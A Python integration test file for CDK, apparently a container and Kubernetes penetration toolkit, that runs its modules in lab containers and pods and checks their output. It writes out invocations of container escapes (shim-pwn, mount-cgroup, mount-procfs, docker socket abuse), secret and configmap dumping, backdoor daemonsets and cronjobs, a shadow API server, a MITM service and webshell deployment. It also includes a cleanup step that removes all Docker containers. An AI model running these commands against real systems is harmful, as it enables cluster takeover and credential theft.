import shlex
import time
import os
from lib.ssh_remote_action import update_remote_bin
from lib.ssh_remote_action import check_host_evaluate
from lib.ssh_remote_action import inside_container_cmd
from lib.ssh_remote_action import check_host_exec
from lib.k8s_remote_action import check_pod_exec, k8s_pod_upload
from lib.k8s_selfbuild_action import selfbuild_k8s_pod_upload, check_selfbuild_k8s_pod_exec, k8s_master_ssh_cmd
from lib.conf import CDK


def test_all():
    # BASE CDK

    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd='',
        white_list=['i@cdxy.me'],
        black_list=[],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd='--help',
        white_list=['i@cdxy.me'],
        black_list=[],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd='-v',
        white_list=['cdk '],
        black_list=[],
        verbose=False
    )

    # EVALUATE

    # host based evaluate
    white_list = [
        'current dir: /root',
        'current user: root',
        'service found in process',
        'sensitive env found',
        '	sshd',
        'available commands',
        'curl,wget,nc',
        'CapEff:	0000003fffffffff',
        'Possible Privileged Container',
        'Filesystem:ext4',
        'host unix-socket found',
        'K8s API Server',
        'K8s Service Account',
        'Cloud Provider Metadata API',
        'http://100.100.100.200/latest/meta-data/',
        'system:anonymous',
        '/kubernetes.io/serviceaccount/token',
        'failed to dial Google Cloud API',
        'failed to dial Azure API',
        # for --full
        '/root/.bashrc',
        'Sensitive Files',
        '/root/.ssh/authorized_keys'
    ]
    black_list = []
    check_host_evaluate('evaluate --full', white_list, black_list)

    # container-based evaluate
    white_list = [
        'current dir: /',
        'current user: root',
        'available commands',
        'find,ps',
        'CapEff:	00000000a80425fb',
        'Filesystem:ext4',
        'host unix-socket found',
        'K8s API Server',
        'K8s Service Account',
        'Cloud Provider Metadata API',
        'http://100.100.100.200/latest/meta-data/',
        'system:anonymous',
        '/kubernetes.io/serviceaccount/token',
        'failed to dial Google Cloud API',
        'failed to dial Azure API',
        '/containerd-shim/',
        # for --full
        'Sensitive Files',
        '/.dockerenv',
        'cannot find kubernetes api host in ENV'
    ]
    black_list = []

    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='--net=host',
        cmd='evaluate --full',
        white_list=white_list,
        black_list=black_list
    )
    inside_container_cmd(
        image='alpine:latest',
        docker_args='--net=host',
        cmd='evaluate --full',
        white_list=white_list,
        black_list=black_list
    )
    # inside_container_cmd(
    #     image = 'centos:latest',
    #     docker_args = '--net=host',
    #     cmd = 'evaluate --full',
    #     white_list = white_list,
    #     black_list = black_list
    # )

    # TOOL

    # tool: ifconfig
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd='ifconfig',
        white_list=['lo', '127.0'],
        black_list=['i@cdxy.me'],
        verbose=False
    )

    # tool: ps
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd='ps',
        white_list=['root', '/usr/bin', '1'],
        black_list=['i@cdxy.me'],
        verbose=False
    )

    # tool: ucurl
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'ucurl',
        white_list=['input args'],
        black_list=['i@cdxy.me'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='-v /var/run/docker.sock:/var/run/docker.sock',
        cmd=r'ucurl get /var/run/docker.sock http://127.0.0.1/info \"\"',
        white_list=['Containers'],
        black_list=['i@cdxy.me', 'input args'],
        verbose=False
    )

    # tool: probe
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd='probe',
        white_list=['input args'],
        black_list=['i@cdxy.me'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd='probe 1.1.1.1 22 10 1000',
        white_list=['scanning'],
        black_list=['i@cdxy.me'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd='probe 1.1.1.1 22 50-999999 1000',
        white_list=['input arg'],
        black_list=['i@cdxy.me'],
        verbose=False
    )

    # tool: vi
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd='vi',
        white_list=['Usage'],
        black_list=['i@cdxy.me'],
        verbose=False
    )

    # tool: nc
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd='nc',
        white_list=['options'],
        black_list=['i@cdxy.me'],
        verbose=False
    )

    # EXPLOIT

    # exploit: --list
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='--net=host',
        cmd='run --list',
        white_list=['test-poc'],
        black_list=['Options:', 'i@cdxy.me'],
        verbose=False
    )

    # exploit: shim-pwn
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='--net=host',
        cmd=r'run shim-pwn \"touch /tmp/shim-pwn-success\"',  # " needs to escape in raw
        white_list=['containerd-shim', 'exploit success'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI '],
        verbose=False
    )
    time.sleep(1)
    check_host_exec('rm /tmp/shim-pwn-success', [], ['No such file or directory'], False)

    # exploit: docker-sock-check
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run docker-sock-check',  # " needs to escape in raw
        white_list=['invalid input args'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run docker-sock-check /var/run/docker.sock',  # " needs to escape in raw
        white_list=['no such file or directory'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='-v /var/run/docker.sock:/var/run/docker.sock',
        cmd=r'run docker-sock-check /var/run/docker.sock',  # " needs to escape in raw
        white_list=['success', 'happy escaping'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit failed'],
        verbose=False
    )

    # exploit: docker-sock-check (will leave a container with image alpine:latest)
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run docker-sock-deploy',  # " needs to escape in raw
        white_list=['invalid input args'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run docker-sock-deploy /var/run/docker.sock alpine:latest',  # " needs to escape in raw
        white_list=['no such file or directory'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='-v /var/run/docker.sock:/var/run/docker.sock',
        cmd=r'run docker-sock-deploy /var/run/docker.sock alpine:latest',  # " needs to escape in raw
        white_list=['success', 'happy escaping', 'alpine:latest', '"ID"', 'starting container:', 'finished'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit failed'],
        verbose=False
    )
    time.sleep(1)
    check_host_exec('docker ps | grep alpine', ['alpine'], [], False)

    # exploit: docker-sock-check (will leave a container with image alpine:latest)
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run mount-cgroup',  # " needs to escape in raw
        white_list=['invalid input args'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run mount-cgroup \"touch /tmp/mount-cgroup-success\"',  # " needs to escape in raw
        white_list=['shell script saved to', 'Execute Shell', 'failed'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='--privileged=true',
        cmd=r'run mount-cgroup \"touch /tmp/mount-cgroup-success\"',  # " needs to escape in raw
        white_list=['finished with output'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'failed'],
        verbose=False
    )
    time.sleep(1)
    check_host_exec('rm /tmp/mount-cgroup-success', [], ['No such file or directory'], False)

    # exploit: service-probe
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run service-probe',  # " needs to escape in raw
        white_list=['invalid input args'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run service-probe 192.168.1.1-^^10',  # " needs to escape in raw
        white_list=['Invalid IP Range'],
        black_list=['i@cdxy.me', 'exploit failed', 'OCI ', 'exploit success'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run service-probe 127.0.0.1',  # " needs to escape in raw
        white_list=['scanning'],
        black_list=['i@cdxy.me', 'exploit failed', 'Invalid'],
        verbose=False
    )

    # exploit: mount-disk
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run mount-disk',  # " needs to escape in raw
        white_list=['failed', 'target container is not privileged'],
        black_list=['i@cdxy.me', 'exploit success'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='--privileged=true',
        cmd=r'run mount-disk',  # " needs to escape in raw
        white_list=['success', 'was mounted to'],
        black_list=['i@cdxy.me', 'failed'],
        verbose=False
    )

    # exploit: mount-procfs
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run mount-procfs',  # " needs to escape in raw
        white_list=['input args'],
        black_list=['i@cdxy.me', 'success'],
        verbose=False
    )
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='-v /proc:/host_proc',
        cmd=r'run mount-procfs /host_proc \"touch /tmp/mount-procfs-success\"',  # " needs to escape in raw
        white_list=['success', 'core dumped'],
        black_list=['i@cdxy.me', 'failed'],
        verbose=False
    )
    time.sleep(1)
    check_host_exec('rm /tmp/mount-procfs-success', [], ['No such file or directory'], False)

    # exploit: reverse-shell
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run reverse-shell',  # " needs to escape in raw
        white_list=['input args'],
        black_list=['i@cdxy.me', 'success'],
        verbose=False
    )

    # exploit: ak-leakage
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='',
        cmd=r'run ak-leakage',  # " needs to escape in raw
        white_list=['input args'],
        black_list=['i@cdxy.me', 'success'],
        verbose=False
    )
    check_host_exec(r'echo "AKIA99999999999999AB" > /tmp/ak-leakage', [], [], False)
    inside_container_cmd(
        image='ubuntu:latest',
        docker_args='-v /tmp/ak-leakage:/tmp/ak-leakage',
        cmd=r'run ak-leakage /tmp',  # " needs to escape in raw
        white_list=['AKIA99999999999999AB'],
        black_list=['i@cdxy.me', 'input args'],
        verbose=False
    )
    check_host_exec(r'rm /tmp/ak-leakage', [], [], False)

    # K8s
    white_list = [
        'System Info',
        'Services',
        'Commands and Capabilities',
        '00000000a80425fb',
        'Filesystem:ext4',
        'net namespace isolated',
        'api-server allows anonymous request',
        'service-account is available',
        'system:serviceaccount:default',
        'Alibaba Cloud Metadata API available'
    ]
    check_pod_exec('evaluate', white_list, ['i@cdxy.me', 'input args'], False)

    # evaluate in K8s
    white_list = [
        'System Info',
        'Services',
        'Commands and Capabilities',
        '00000000a80425fb',
        'Filesystem:ext4',
        'net namespace isolated',
        'api-server allows anonymous request',
        'service-account is available',
        'system:serviceaccount:default',
        'Alibaba Cloud Metadata API available'
    ]
    check_pod_exec('evaluate', white_list, ['i@cdxy.me', 'input args'], False)

    # exploit: k8s-configmap-dump
    check_pod_exec(
        'run k8s-configmap-dump',
        ['input args'],
        ['i@cdxy.me', 'cdk evaluate'],
        False
    )
    check_pod_exec(
        'run k8s-configmap-dump auto',
        ['success', 'k8s_configmaps.json'],
        ['input args', 'i@cdxy.me', 'cdk evaluate'],
        False
    )
    check_pod_exec(
        'run k8s-configmap-dump /tmp/jkdhahdjfka2',
        ['no such file or directory'],
        ['input args', 'i@cdxy.me', 'cdk evaluate'],
        False
    )

    # exploit: k8s-secret-dump
    check_pod_exec(
        'run k8s-secret-dump',
        ['input args'],
        ['i@cdxy.me', 'cdk evaluate'],
        False
    )
    check_pod_exec(
        'run k8s-secret-dump auto',
        ['success', 'k8s_secrets.json'],
        ['input args', 'i@cdxy.me', 'cdk evaluate'],
        False
    )

    # tool: kcurl
    check_pod_exec(
        'kcurl',
        ['to K8s api-server'],  # help msg
        ['panic:', 'cdk evaluate'],
        False
    )
    check_pod_exec(
        'kcurl default get https://172.21.0.1:443/api/v1/nodes',  # forbidden
        ['apiVersion', 'nodes is forbidden'],
        ['panic:', 'cdk evaluate', 'empty'],
        False
    )
    check_pod_exec(
        'kcurl anonymous get https://172.21.0.1:443/api/v1/nodes',  # success dump
        ['apiVersion'],
        ['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
        False
    )
    check_pod_exec(
        r'''
        kcurl anonymous post 'https://172.21.0.1:443/api/v1/namespaces/default/pods?fieldManager=kubectl-client-side-apply' '{"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"cdxy-test-2021\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"ubuntu:latest\",\"name\":\"container\"}]}}\n"},"name":"cdxy-test-2021","namespace":"default"},"spec":{"containers":[{"image":"ubuntu:latest","name":"container"}]}}'
        '''.replace('\n', ''),
        ['apiVersion', 'api-server response'],
        ['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
        False
    )

    # run: k8s-backdoor-daemonset
    check_pod_exec(
        'run k8s-backdoor-daemonset 1',  # success dump
        ['invalid'],
        ['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
        False
    )
    check_pod_exec(
        'run k8s-backdoor-daemonset anonymous ubuntu',  # success dump
        ['cdk-backdoor-daemonset'],
        ['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
        False
    )

    # run: istio-check
    check_pod_exec(
        'run istio-check',
        ['the shell is not in a istio'],
        ['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
        False
    )

    # test evaluate in selfbuild k8s
    # make sure bind system:default:default to cluster-admin first (test/k8s_exploit_yaml/default_to_admin.yaml)
    check_selfbuild_k8s_pod_exec(
        'evaluate',
        ['00000000a80425fb', 'Discovery - K8s API Server', 'the service-account have a high authority'],
        ['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
        False
    )

    # run: k8s-shadow-apiserver
    k8s_master_ssh_cmd(
        'kubectl delete pod kube-apiserver-cn-beijing.192.168.0.150-shadow -n kube-system',
        [],
        [],
        False
    )
    check_selfbuild_k8s_pod_exec(
        'run k8s-shadow-apiserver default',  # success
        ['listening insecure-port: 0.0.0.0:9443'],
        ['panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
        False
    )
    check_selfbuild_k8s_pod_exec(
        'run k8s-shadow-apiserver anonymous',  # forbidden
        ['forbidden this request'],
        ['listening insecure-port: 0.0.0.0:9443', 'panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
        False
    )
    k8s_master_ssh_cmd(
        'kubectl exec myappnew -- curl 192.168.0.150:9443',  # curl shadow-apiserver
        ['/api/v1'],
        [],
        False
    )

    # run: k8s-mitm-clusterip
    k8s_master_ssh_cmd(
        'kubectl delete deployment mitm-payload-deploy',
        [],
        [],
        False
    )
    k8s_master_ssh_cmd(
        'kubectl delete service mitm-externalip',
        [],
        [],
        False
    )
    check_selfbuild_k8s_pod_exec(
        'run k8s-mitm-clusterip default ubuntu 9.9.9.9 99',  # forbidden
        ['selfLink'],
        ['listening insecure-port: 0.0.0.0:9443', 'panic:', 'nodes is forbidden', 'cdk evaluate', 'empty'],
        False
    )

    # exploit: webshell-deploy
    check_pod_exec(
        'run webshell-deploy php /var/www/html212/1.php',
        ['no such file or directory', 'failed'],
        ['input args', 'i@cdxy.me', 'cdk evaluate'],
        False
    )
    check_pod_exec(
        'run webshell-deploy php',
        ['input args'],
        ['i@cdxy.me', 'cdk evaluate'],
        False
    )
    check_pod_exec(
        'run webshell-deploy js1p /tmp/1.jsp',
        ['input args'],
        ['i@cdxy.me', 'cdk evaluate'],
        False
    )
    check_pod_exec(
        'run webshell-deploy jsp /tmp/1.jsp',
        ['webshell saved in'],
        ['i@cdxy.me', 'cdk evaluate', '%s', 'input args'],
        False
    )

    # run: cronjob
    k8s_master_ssh_cmd(
        'kubectl delete cronjob cdk-backdoor-cronjob -n kube-system',
        [],
        [],
        False
    )
    check_selfbuild_k8s_pod_exec(
        'run k8s-cronjob default min alpine "echo helloworld"',
        ['generate cronjob with', 'selfLink'],
        ['i@cdxy.me', 'cdk evaluate', '%s', 'input args'],
        False
    )


def test_dev():
    time.sleep(0.5)
    k8s_master_ssh_cmd(
        'kubectl delete cronjob cdk-backdoor-cronjob -n kube-system',
        [],
        [],
        False
    )


def clear_all_env():
    k8s_master_ssh_cmd(
        'kubectl delete cronjob cdk-backdoor-cronjob -n kube-system',
        [],
        [],
        False
    )
    k8s_master_ssh_cmd(
        'kubectl delete pod kube-apiserver-cn-beijing.192.168.0.150-shadow -n kube-system',
        [],
        [],
        False
    )
    k8s_master_ssh_cmd(
        'kubectl delete deployment mitm-payload-deploy',
        [],
        [],
        False
    )
    k8s_master_ssh_cmd(
        'kubectl delete service mitm-externalip',
        [],
        [],
        False
    )
    check_host_exec(r'docker stop $(docker ps -q) & docker rm $(docker ps -aq)', [], [], False)


if __name__ == '__main__':
    # # build
    # print('-' * 10, 'build CDK binary', '-' * 10)
    # print('[Local]', CDK.BUILD_CMD)
    # os.system(CDK.BUILD_CMD)
    #
    # # upload
    # print('-' * 10, 'upload CDK to ECS, ACK, Selfbuild-K8s', '-' * 10)
    # update_remote_bin()
    # k8s_pod_upload()
    # selfbuild_k8s_pod_upload()
    # print('-' * 10, 'upload all done', '-' * 10)

    # test
    test_dev()
    # test_all()
    # clear_all_env()
